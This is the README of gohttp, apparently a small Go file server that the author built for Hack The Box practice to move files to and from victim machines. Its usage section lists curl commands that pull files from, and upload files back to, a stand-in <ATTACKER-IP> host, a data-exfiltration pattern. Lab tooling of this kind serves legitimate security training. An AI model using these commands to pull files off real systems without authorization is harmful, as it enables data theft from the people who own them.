# gohttp
While playing on *hackthebox.com* I was missing the capability to upload files from the victims machines back to my machine with Python SimpleHTTPServer.  
Therefore I wrote **gohttp** which supports both uploading and downloading files just by using the go standard library.

## Installation
### easy install
```bash
go install github.com/hebelsan/gohttp
```
### docker
```bash
TODO
```
### manual
```bash
git clone https://github.com/hebelsan/gohttp
go run main.go
```

## Usage
All the files that should be served must go into the **./static** folder.

###  Download a file from your attack device:
```bash
curl -O http://<ATTACKER-IP>/<FILENAME>
```

###  Upload a file back to your attack device as multipart
```bash
curl -F 'file=@<FILENAME>' http://<ATTACKER-IP>/
```

###  Multiple file upload supported, just add more -F 'file=@<FILENAME>'
```bash
curl -F 'file=@<FILE1>' -F 'file=@<FILE2>' http://<ATTACKER-IP>/
```

###  Upload using raw body and filename header
```bash
curl -H "filename: test.txt" --data "this is raw data" http://<ATTACKER-IP>/
```

## Configuration

### Authentication
If you are scared that somebody else in your network 
either get's access to your files in **/static** or uploads
files without your permission set:
```bash
export AUTH=API-KEY
```
This will generate a new api key on startup and after each request.  
The key is printed to the console and has to be passed 
as `X-API-KEY` header:
```bash
curl -H "X-Api-Key: F94CE8F8-2E28-7806-94A4-8DF3FB722814" -F 'file=@<FILENAME>' http://<ATTACKER-IP>/
```

### Port
Per default port 80 is used. To change it:
```bash
export PORT=4444
```